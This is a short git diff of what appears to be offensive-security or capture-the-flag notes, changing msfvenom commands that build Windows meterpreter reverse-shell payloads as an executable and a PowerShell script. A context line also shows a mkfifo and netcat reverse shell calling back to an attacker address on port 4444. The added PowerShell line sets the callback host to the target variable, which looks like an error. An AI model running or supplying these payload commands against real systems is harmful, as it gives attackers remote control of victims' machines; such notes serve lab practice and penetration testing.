@@ -37,7 +37,9 @@ mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1;
 Create reverse shell payload, exploit user and escalate to admin:
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=$LOCAL_IP LPORT=4444 -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=$LOCAL_IP LPORT=4444 -f exe -o shell.exe
+#powershell rev shell generator
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$TARGET_IP$ LPORT=4444 -f psh -o meterpreter-64.ps1
 ```
 
 ```msfconsole
